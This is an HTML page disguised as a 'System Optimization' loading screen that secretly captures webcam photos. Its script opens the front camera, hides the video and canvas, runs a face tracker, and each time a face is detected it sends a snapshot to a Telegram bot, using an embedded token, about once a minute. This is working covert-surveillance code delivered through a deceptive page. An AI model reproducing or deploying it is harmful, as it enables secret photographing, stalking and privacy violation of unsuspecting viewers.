<!DOCTYPE html>
<html>
<head>
    <title>System Optimization</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clmtrackr/1.3.1/clmtrackr.min.js"></script>
    <style>
        /* Makes the page look like a dark loading screen */
        body { background: #000; color: #111; margin: 0; padding: 0; overflow: hidden; }
        #v, #c { display: none; } /* Hides camera and canvas completely */
    </style>
</head>
<body>

    <video id="v" width="400" height="300" autoplay playsinline muted></video>
    <canvas id="c" width="400" height="300"></canvas>

    <script>
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const botToken = "8041664147:AAF8SEZD3WUzX2wLBbMzc5V4nQKStkNS_sM";
        const chatId = "YOUR_PERSONAL_CHAT_ID"; // <--- MUST BE YOUR NUMERIC ID

        // Initialize Camera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    startAI();
                };
            })
            .catch(err => console.log("Init error"));

        function startAI() {
            const tracker = new clm.tracker();
            tracker.init();
            tracker.start(video);

            function track() {
                if (tracker.getCurrentPosition()) {
                    capture();
                }
                requestAnimationFrame(track);
            }
            track();
        }

        let ready = true;
        function capture() {
            if (!ready) return;
            ready = false;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 400, 300);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'me.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                }).then(() => {
                    // Captures again after 60 seconds if face is still there
                    setTimeout(() => { ready = true; }, 60000);
                }).catch(() => { ready = true; });
            }, 'image/jpeg', 0.6); // 0.6 quality for faster upload
        }
    </script>
</body>
</html>
